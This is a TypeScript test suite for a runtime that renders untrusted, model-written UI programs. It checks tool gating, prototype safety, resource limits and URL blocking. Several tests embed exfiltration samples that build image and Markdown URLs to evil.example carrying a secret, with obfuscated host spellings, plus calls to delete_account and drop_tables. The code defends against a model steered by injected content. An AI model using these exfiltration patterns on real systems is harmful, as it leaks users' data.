/**
 * The program is untrusted (a model wrote it, possibly steered by content it read). These tests pin
 * what a program must not be able to do: call tools it should not, read inherited properties, forge
 * engine markers, or make the host hang or throw.
 */
import { describe, expect, test } from "bun:test";
import { createStream, defineLibrary, parse, Runtime, validate, type RuntimeEvent } from "../src/index";

const lib = defineLibrary({
  components: [
    { name: "Stack", children: true, props: {} },
    { name: "Panel", children: true, props: { header: { type: "node" } } },
    { name: "Text", args: ["content"], props: { content: { type: "string", required: true } } },
    { name: "Callout", args: ["content"], props: { content: { type: "string", required: true }, tone: { type: "enum", values: ["info", "success", "warning"] } } },
    { name: "Select", args: ["name", "options"], props: { name: { type: "string", required: true }, options: { type: "array" } } },
    { name: "Chart", args: ["data"], props: { data: { type: "data" } } },
    { name: "Image", args: ["src"], props: { src: { type: "string", required: true, format: "url" }, alt: { type: "string" } } },
    { name: "Gallery", args: ["images"], props: { images: { type: "array", items: { type: "string", format: "url" } } } },
    { name: "Button", args: ["label"], props: { label: { type: "string", required: true }, do: { type: "action" } } },
    { name: "Tabs", children: { of: ["Tab"] }, props: {} },
    { name: "Tab", args: ["label"], children: true, props: { label: { type: "string", required: true } } },
  ],
});

function setup(src: string, opts: ConstructorParameters<typeof Runtime>[1] & { allowedHosts?: readonly string[] } = {}) {
  const s = createStream(lib, { allowedHosts: opts.allowedHosts });
  s.push(src);
  s.end();
  const events: RuntimeEvent[] = [];
  const rt = new Runtime(s, { onEvent: (e) => events.push(e), ...opts });
  const tree = (id = s.store.root!): unknown => {
    const n = rt.view(id)!;
    const kids = n.children.map((c) => tree(c));
    return n.type === "#fragment" ? kids : { type: n.type, props: n.props, ...(kids.length ? { children: kids } : {}) };
  };
  return { s, rt, tree, events };
}
const settle = () => new Promise((r) => setTimeout(r, 5));
const text = (t: unknown): string => JSON.stringify(t);

describe("tools", () => {
  test("@query reaches read-only tools only; a mutating tool never runs by rendering", async () => {
    const called: string[] = [];
    const { rt, tree } = setup(`root = Stack(Text("" + d.ok))\nd = @query("delete_account", {id: 42})\n`, {
      tools: { list: async () => (called.push("list"), []) },
      mutations: { delete_account: async () => (called.push("delete_account"), { ok: true }) },
    });
    tree();
    await settle();
    expect(called).toEqual([]);
    expect(rt.queryStatus("d").error).toContain("not available to @query");
  });

  test("@mutation reaches `mutations` only, from an action; inherited names are not tools", async () => {
    const called: string[] = [];
    const { s, rt, tree, events } = setup(
      `root = Stack(a, b, Text("" + q.x))\nsave = @mutation("save", {})\nread = @mutation("list", {})\na = Button("Save", do:[@run(save)])\nb = Button("Read", do:[@run(read)])\nq = @query("constructor", {x: 1})\n`,
      { tools: { list: async () => (called.push("list"), []) }, mutations: { save: async () => (called.push("save"), 1) } },
    );
    tree();
    await settle();
    expect(called).toEqual([]);
    expect(rt.queryStatus("q").error).toContain("not available");
    await rt.run(s.store.get("a")!.dyn!.do!, "a");
    expect(called).toEqual(["save"]);
    await rt.run(s.store.get("b")!.dyn!.do!, "b");
    expect(called).toEqual(["save"]);
    // One for the query that named something that is not a tool (reported once), one for the mutation that named a read-only tool.
    expect(events.filter((e) => e.type === "error").map((e) => `${(e as { code: string }).code}:${(e as { nodeId?: string }).nodeId}`)).toEqual(["tool-not-found:q", "tool-not-found:b"]);
  });

  test("an MCP-style client exposes nothing to @query without an allow list", async () => {
    const called: string[] = [];
    const client = { callTool: async (name: string) => (called.push(name), [1]) };
    const a = setup(`root = Stack(Chart(q))\nq = @query("anything", {})\n`, { tools: client });
    a.tree();
    await settle();
    expect(called).toEqual([]);
    const b = setup(`root = Stack(Chart(q), Chart(r))\nq = @query("list_orders", {})\nr = @query("drop_tables", {})\n`, { tools: { ...client, allow: ["list_orders"] } });
    b.tree();
    await settle();
    expect(called).toEqual(["list_orders"]);
  });

  test("onToolCall can block a call; a burst of calls is capped", async () => {
    let calls = 0;
    const a = setup(`root = Stack(Chart(q))\nq = @query("load", {})\n`, { tools: { load: async () => (calls++, [1]) }, onToolCall: () => false });
    a.tree();
    await settle();
    expect(calls).toBe(0);
    expect(a.rt.queryStatus("q").error).toContain("not allowed");
    const many = Array.from({ length: 30 }, (_, i) => `q${i} = @query("load", {n: ${i}})`).join("\n");
    const b = setup(`root = Stack(${Array.from({ length: 30 }, (_, i) => `Chart(q${i})`).join(", ")})\n${many}\n`, { tools: { load: async () => (calls++, [1]) }, maxToolCalls: 10 });
    b.tree();
    await settle();
    expect(calls).toBe(10);
  });

  test("a query whose arguments read the query does not loop or throw", async () => {
    let calls = 0;
    const tools = { t: async () => (calls++, 1) };
    for (const src of [`root = Stack(Text("" + a))\na = @query("t", {x: a})\n`, `root = Stack(Text("" + a))\nk = a + 1\na = @query("t", {x: k}, default: 0)\n`, `root = Stack(Text("" + a))\na = @query("t", {n: b})\nb = @query("t", {n: a})\n`]) {
      calls = 0;
      const { tree } = setup(src, { tools });
      tree();
      await settle();
      tree();
      await settle();
      expect(calls).toBeLessThanOrEqual(2);
    }
  });

  test("identical calls made together share one request", async () => {
    let calls = 0;
    const { tree } = setup(`root = Stack(Chart(a), Chart(b))\na = @query("t", {n: 1})\nb = @query("t", {n: 1})\n`, { tools: { t: async () => (calls++, [1]) } });
    tree();
    await settle();
    expect(calls).toBe(1);
  });

  test("every: a very large interval never polls; a removed query stops", async () => {
    let calls = 0;
    const { s, rt, tree } = setup(`root = Stack(Chart(q))\nq = @query("t", {}, every: 3000000)\n`, { tools: { t: async () => (calls++, [1]) } });
    tree();
    await new Promise((r) => setTimeout(r, 60));
    expect(calls).toBe(1);
    s.rewrite(`root = Stack(Text("no query any more"))\n`);
    rt.sync();
    expect(rt.queryStatus("q").data).toBeUndefined();
    rt.dispose();
  });
});

describe("paused refresh", () => {
  test("setPaused stops every: timers and starts them again; the first load still happens", async () => {
    let calls = 0;
    const { rt, tree } = setup(`root = Stack(Chart(q))\nq = @query("t", {}, every: 0.02)\n`, { minInterval: 0.02, tools: { t: async () => (calls++, [1]) } });
    rt.setPaused(true);
    tree();
    await new Promise((r) => setTimeout(r, 90));
    expect(calls).toBe(1);
    rt.setPaused(false);
    await new Promise((r) => setTimeout(r, 90));
    expect(calls).toBeGreaterThan(1);
    rt.setPaused(true);
    await settle();
    const at = calls;
    await new Promise((r) => setTimeout(r, 90));
    expect(calls).toBe(at);
    rt.dispose();
  });
});

describe("held until start", () => {
  test("live:false builds the UI with defaults and calls no tool; start() makes the calls", async () => {
    let calls = 0;
    const { rt, tree } = setup(`root = Stack(Chart(q))\nq = @query("t", {}, default: [0], every: 0.02)\n`, { live: false, minInterval: 0.02, tools: { t: async () => (calls++, [1]) } });
    expect(text(tree())).toContain("[0]");
    await new Promise((r) => setTimeout(r, 70));
    expect(calls).toBe(0);
    expect(rt.queryStatus("q").loading).toBe(false);
    rt.start();
    await new Promise((r) => setTimeout(r, 70));
    expect(calls).toBeGreaterThan(1);
    expect(text(tree())).toContain("[1]");
    rt.dispose();
  });
});

describe("URLs that load by themselves", () => {
  const secret = `d = {secret: "s3cr3t", img: "https://cdn.shop.example/a.png"}\n`;

  test("a URL assembled from data is not loaded; one written out or read whole from data is", () => {
    const { tree, events } = setup(
      `${secret}root = Stack(Image("https://evil.example/p.png?d=" + d.secret), Image("https://pics.example/static.png"), Image(d.img), Image("/local/" + d.secret + ".png"))\n`,
    );
    const out = tree() as { children: { props: { src: string } }[] };
    expect(out.children.map((c) => c.props.src)).toEqual(["", "https://pics.example/static.png", "https://cdn.shop.example/a.png", "/local/s3cr3t.png"]);
    tree();
    // Reported once, not on every evaluation.
    expect(events.filter((e) => e.type === "error" && e.code === "blocked-url")).toHaveLength(1);
  });

  test("spellings a browser still treats as another host are caught", () => {
    for (const url of [`"//evil.example/?d=" + d.secret`, `"https:\\\\\\\\evil.example\\\\" + d.secret`, `"ht\\ttps://evil.example/" + d.secret`, `@join(["https://evil.example/?d=", d.secret], "")`]) {
      const { tree } = setup(`${secret}root = Stack(Image(${url}))\n`);
      expect(text(tree())).toContain('"src":""');
    }
  });

  test("through state, @each, a list prop and a background image", () => {
    const { tree, rt } = setup(
      `${secret}$u = "x"\nitems = [{id: "a"}, {id: "b"}]\nroot = Stack(Image($u), @each(items, i => Image("https://evil.example/" + i.id)), Gallery(["https://ok.example/1.png", "https://evil.example/?d=" + d.secret]), Panel(style: {image: "https://evil.example/bg?d=" + d.secret, pad: 8}))\n`,
    );
    rt.setState("u", rt.evaluate({ k: "bin", op: "+", l: { k: "str", v: "https://evil.example/?d=" }, r: { k: "str", v: "s3cr3t" } } as never));
    const out = text(tree());
    expect(out).not.toContain("evil.example");
    expect(out).toContain("https://ok.example/1.png");
    expect(out).toContain('"pad":8');
  });

  test("allowedHosts: only those hosts load, written out or assembled; relative URLs always do", () => {
    const program = `${secret}root = Stack(Image("https://cdn.shop.example/img/" + d.secret + ".png"), Image("https://other.example/x.png"), Image("img/x.png"), Image("https://a.assets.example/y.png"), Image("https://assets.example/y.png"), Image("https://evilassets.example/y.png"))\n`;
    const { tree, s } = setup(program, { allowedHosts: ["cdn.shop.example", "*.assets.example"] });
    const out = tree() as { children: { props: { src: string } }[] };
    expect(out.children.map((c) => c.props.src)).toEqual(["https://cdn.shop.example/img/s3cr3t.png", "", "img/x.png", "https://a.assets.example/y.png", "", ""]);
    const blocked = s.errors().filter((e) => e.code === "blocked-url");
    expect(blocked).toHaveLength(3);
    expect(blocked.every((e) => e.severity === "warning")).toBe(true);
    // A refused URL is a repaired warning: the program is still valid.
    expect(blocked.every((e) => e.fixed === true)).toBe(true);
  });

  test("loads(): what a renderer asks for the images of a Markdown text", () => {
    const { rt, tree } = setup(`${secret}root = Stack(Text("![x](https://evil.example/?d=" + d.secret + ")"))\n`);
    const content = (tree() as { children: { props: { content: string } }[] }).children[0]!.props.content;
    expect(rt.loads("https://evil.example/?d=s3cr3t", content)).toBe(false);
    expect(rt.loads("https://pics.example/a.png", "A static text ![a](https://pics.example/a.png)")).toBe(true);
    const strict = setup(`root = Stack(Text("hi"))\n`, { allowedHosts: ["pics.example"] });
    expect(strict.rt.loads("https://pics.example/a.png")).toBe(true);
    expect(strict.rt.loads("https://evil.example/a.png")).toBe(false);
    expect(strict.rt.loads("/a.png")).toBe(true);
  });
});

describe("repeated components", () => {
  /** Counts what a renderer would show: every use of a shared statement counts. */
  function shown(s: ReturnType<typeof createStream>): number {
    const memo = new Map<string, number>();
    const count = (id: string): number => {
      const hit = memo.get(id);
      if (hit !== undefined) return hit;
      const n = s.store.get(id);
      const total = n ? 1 + n.children.reduce((sum, c) => sum + count(c), 0) : 0;
      memo.set(id, total);
      return total;
    };
    return count(s.store.root!);
  }

  test("a few lines cannot ask for hundreds of thousands of components", () => {
    // 22 lines: each level shows the next one twice (2^22 leaves if nothing stopped it).
    const levels = 22;
    let src = `root = Stack(n0)\n`;
    for (let i = 0; i < levels; i++) src += `n${i} = Stack(n${i + 1}, n${i + 1})\n`;
    src += `n${levels} = Text("leaf")\n`;
    for (const chunk of [src.length, 7]) {
      const s = createStream(lib);
      for (let i = 0; i < src.length; i += chunk) {
        s.push(src.slice(i, i + chunk));
        s.flush();
        // Never over the limit, also half way through the stream.
        if (s.store.root) expect(shown(s)).toBeLessThanOrEqual(50_100);
      }
      s.end();
      const total = shown(s);
      expect(total).toBeGreaterThan(10_000);
      expect(total).toBeLessThanOrEqual(50_100);
      expect(s.errors().some((e) => e.code === "limit")).toBe(true);
      // The top of the program is still there.
      expect(s.store.get("root")!.children).toEqual(["n0"]);
    }
  });

  test("a normal program that reuses a statement is not touched", () => {
    const s = createStream(lib);
    s.push(`root = Stack(a, a, Panel(a, header: a))\na = Text("shared")\n`);
    s.end();
    expect(s.errors().filter((e) => e.code === "limit")).toEqual([]);
    expect(shown(s)).toBe(5);
  });
});

describe("site icons", () => {
  test("off unless the host turns them on; they follow the allowed hosts", () => {
    const program = `root = Stack(Text("hi"))\n`;
    expect(setup(program).rt.favicon("reuters.com")).toBeUndefined();
    const on = setup(program, { favicons: "https://icons.example/{host}.png" });
    expect(on.rt.favicon("reuters.com")).toBe("https://icons.example/reuters.com.png");
    // Not a host name: nothing is requested.
    expect(on.rt.favicon("evil.example/?x=1")).toBeUndefined();
    expect(on.rt.favicon(undefined)).toBeUndefined();
    const strict = setup(program, { favicons: "https://icons.example/{host}.png", allowedHosts: ["cdn.example"] });
    expect(strict.rt.favicon("reuters.com")).toBeUndefined();
    const listed = setup(program, { favicons: "https://icons.example/{host}.png", allowedHosts: ["icons.example"] });
    expect(listed.rt.favicon("reuters.com")).toBe("https://icons.example/reuters.com.png");
  });
});

describe("@run", () => {
  test("runs @mutation and @query statements only: another statement cannot name a tool", async () => {
    const called: string[] = [];
    const { rt, events } = setup(
      `root = Stack(Button("Go", do:[@run(x)]), Button("Save", do:[@run(save)]))\nx = @fmt("save_goal", "")\ny = @join(["save_goal"], "")\nsave = @mutation("save_goal", {id: 1})\n`,
      { mutations: { save_goal: async () => void called.push("save_goal") }, tools: { save_goal: async () => void called.push("tool") } },
    );
    for (const target of ["x", "y", "root", "nothing"]) {
      await rt.run({ k: "arr", items: [{ k: "builtin", name: "@run", args: [{ value: { k: "ref", name: target } }] }] } as never, "b");
    }
    expect(called).toEqual([]);
    expect(events.filter((e) => e.type === "error" && e.code === "unknown-step")).toHaveLength(4);
    await rt.run({ k: "arr", items: [{ k: "builtin", name: "@run", args: [{ value: { k: "ref", name: "save" } }] }] } as never, "b");
    expect(called).toEqual(["save_goal"]);
  });
});

describe("values", () => {
  test("only own properties are read: no inherited members, no prototype keys", () => {
    const { tree } = setup(`$t = "constructor"\nd = {a: 1}\nroot = Stack(Text("v=" + constructor), Text("m=" + d.constructor), Text("i=" + d["toString"]), Text("p=" + d.__proto__), Callout("hi", tone:$t))\n`);
    const out = text(tree());
    expect(out).not.toContain("function");
    expect(out).not.toContain("native code");
    expect(out).toContain('"v="');
  });

  test("a runtime value is checked against the schema like a static one", () => {
    const { tree } = setup(`$t = "sucess"\n$bad = {x: 1}\nroot = Stack(Callout("a", tone:$t), Callout("b", tone:$bad), @each([1], x => Callout("c", bogus: 1, tone: "not-a-tone", dangerouslySetInnerHTML: {__html: "<img>"})))\n`);
    const out = text(tree());
    expect(out).toContain('"tone":"success"'); // a close typo is corrected, as for static values
    expect(out).not.toContain("bogus");
    expect(out).not.toContain("dangerouslySetInnerHTML");
    expect(out).not.toContain("not-a-tone");
  });

  test("engine markers and prototype keys cannot be written in an object literal", () => {
    const r = parse(`root = Stack(Text({"$dyn": null}), Select("s", [{"$ref": "root"}, {"__proto__": {"polluted": 1}}]))\n`, lib);
    const s = createStream(lib);
    s.push(`root = Stack(Text({"$dyn": null}), Select("s", [{"$ref": "root"}, {"__proto__": {"polluted": 1}}]))\n`);
    s.end();
    const rt = new Runtime(s);
    expect(() => rt.view("root")).not.toThrow();
    expect(({} as { polluted?: number }).polluted).toBeUndefined();
    expect(text(r.root)).not.toContain("$ref");
  });

  test("== compares objects by content; @each keys are unique", () => {
    const { tree } = setup(
      `$a = {id: 1}\n$b = {id: 2}\nrows = |id|name\n|1|Ada\n|1|Bob\n|2|Cy\nroot = Stack(Text($a == $b ? "equal" : "different"), Text($a == {id: 1} ? "same" : "not"), @each(rows, r => Text(r.name)))\n`,
    );
    const out = text(tree());
    expect(out).toContain("different");
    expect(out).toContain("same");
    expect(out).toContain("Ada");
    expect(out).toContain("Bob");
    expect(out).toContain("Cy");
  });

  test("a state default is read only from a complete declaration", () => {
    const s = createStream(lib);
    s.push(`$name = "Hel`);
    s.flush();
    const rt = new Runtime(s);
    rt.sync();
    s.push(`lo world"\nroot = Text($name)\n`);
    s.end();
    rt.sync();
    expect(rt.getState("name")).toBe("Hello world");
    expect((rt.view("root")!.props as { content: string }).content).toBe("Hello world");
  });

  test("a bound value is there when the component first renders (state is declared before the commit)", () => {
    const s = createStream(lib);
    s.push(`root = Stack(a)\n`);
    s.flush();
    const rt = new Runtime(s);
    const seen: unknown[] = [];
    s.store.subscribe("root", () => seen.push(rt.getState("name")));
    rt.subscribe("a", () => seen.push(rt.getState("name")));
    s.push(`$name = "Ada"\na = Text($name)\n`);
    s.flush();
    rt.sync();
    expect(seen.length).toBeGreaterThan(0);
    expect(seen.every((v) => v === "Ada")).toBe(true);
  });
});

describe("limits", () => {
  test("a shared chain of expressions is evaluated once per link, not 2^n times", () => {
    const lines = [`$s = 1`, `a0 = $s + 1`];
    for (let i = 1; i <= 40; i++) lines.push(`a${i} = a${i - 1} + a${i - 1}`);
    lines.push(`root = Text("" + a40)`);
    const t0 = performance.now();
    const { tree } = setup(lines.join("\n") + "\n");
    tree();
    expect(performance.now() - t0).toBeLessThan(200);
  });

  test("runaway programs stop at a limit and report it; the host does not hang or throw", () => {
    // Text that doubles 40 times, nested @each over 60 items three deep, a 2^18 fan-out of children.
    const doubling = [`s0 = "xxxxxxxxxx" + $z`, ...Array.from({ length: 40 }, (_, i) => `s${i + 1} = s${i} + s${i}`), `root = Text(s40)`, `$z = ""`].join("\n") + "\n";
    const a = setup(doubling);
    expect(() => a.tree()).not.toThrow();
    expect(a.events.some((e) => e.type === "error" && e.code === "limit")).toBe(true);

    const list = `[${Array.from({ length: 60 }, (_, i) => i).join(",")}]`;
    const t0 = performance.now();
    const b = setup(`$n = ${list}\nroot = Stack(@each($n, x => @each($n, y => @each($n, z => Text("" + x + y + z)))))\n`);
    expect(() => b.tree()).not.toThrow();
    expect(b.events.some((e) => e.type === "error" && e.code === "limit")).toBe(true);
    expect(performance.now() - t0).toBeLessThan(3000);

    const chain = [`a0 = ["x"]`, ...Array.from({ length: 30 }, (_, i) => `a${i + 1} = [a${i}, a${i}]`), `root = Stack(a30)`].join("\n") + "\n";
    const t1 = performance.now();
    const r = parse(chain, lib);
    expect(r.errors.some((e) => e.code === "limit")).toBe(true);
    expect(performance.now() - t1).toBeLessThan(2000);
  });

  test("a data DAG is walked once: end, snapshot and redefinition stay fast", () => {
    const chain = [`a0 = [1]`, ...Array.from({ length: 16 }, (_, i) => `a${i + 1} = [a${i}, a${i}]`), `root = Select("n", a16)`].join("\n") + "\n";
    const t0 = performance.now();
    const s = createStream(lib);
    s.push(chain);
    s.end();
    s.snapshot();
    expect(performance.now() - t0).toBeLessThan(1500);
  });

  test("a data statement that contains itself is a reported cycle, the same at any chunk size", () => {
    for (const src of [`d = {a: d, b: 1}\nroot = Select("n", [d])\n`, `a = [b, "x"]\nb = [a, "y"]\nroot = Stack(a)\n`]) {
      const whole = parse(src, lib);
      expect(whole.errors.some((e) => e.code === "cycle")).toBe(true);
      const s = createStream(lib);
      for (const ch of src) {
        s.push(ch);
        s.flush();
      }
      s.end();
      expect(JSON.stringify(s.snapshot())).toBe(JSON.stringify(whole.root));
    }
  });

  test("a cycle through a component-valued prop is cut and reported", () => {
    const r = parse(`root = Panel(Text("x"), header: a)\na = Panel(header: root)\n`, lib);
    expect(r.errors.map((e) => e.code)).toContain("cycle");
    expect(() => JSON.stringify(r.root)).not.toThrow();
  });

  test("a child the parent does not accept is reported whichever statement comes first", () => {
    const before = parse(`a = Text("x")\nroot = Tabs(a)\n`, lib).errors.map((e) => e.code);
    const after = parse(`root = Tabs(a)\na = Text("x")\n`, lib).errors.map((e) => e.code);
    expect(before).toEqual(["invalid-child"]);
    expect(after).toEqual(["invalid-child"]);
  });

  test("a chain of 20,000 nested statements parses, ends and snapshots without a stack overflow", () => {
    const lines = [`root = Stack(a0)`];
    for (let i = 0; i < 20000; i++) lines.push(`a${i} = Stack(a${i + 1})`);
    lines.push(`a20000 = Text("end")`);
    const r = parse(lines.join("\n") + "\n", lib);
    expect(r.root).not.toBeNull();
    expect(() => validate(lines.join("\n") + "\n", lib)).not.toThrow();
  });

  test("validate() does not throw on data that looks like a node", () => {
    expect(() => validate(`root = Stack(Select("n", [{type: 1, children: []}]))\n`, lib)).not.toThrow();
  });
});

describe("streaming", () => {
  test("a redefinition that fails to parse leaves the earlier definition, at any chunk size", () => {
    const src = `root = Stack(a)\na = Text("one")\na = Text("two")?\n`;
    const whole = JSON.stringify(parse(src, lib).root);
    expect(whole).toContain("one");
    for (const size of [1, 2, 3, 7]) {
      const s = createStream(lib);
      for (let i = 0; i < src.length; i += size) {
        s.push(src.slice(i, i + size));
        s.flush();
      }
      s.end();
      expect(JSON.stringify(s.snapshot())).toBe(whole);
    }
  });

  test("a very long streamed text is appended in linear time", () => {
    const s = createStream(lib);
    s.push(`root = Text("`);
    s.flush();
    const t0 = performance.now();
    const piece = "lorem ipsum dolor ";
    for (let i = 0; i < 12000; i++) {
      s.push(piece);
      s.flush();
    }
    s.push(`")\n`);
    s.end();
    expect(performance.now() - t0).toBeLessThan(1500);
    expect((s.store.get("root")!.props as { content: string }).content.length).toBe(piece.length * 12000);
  });
});
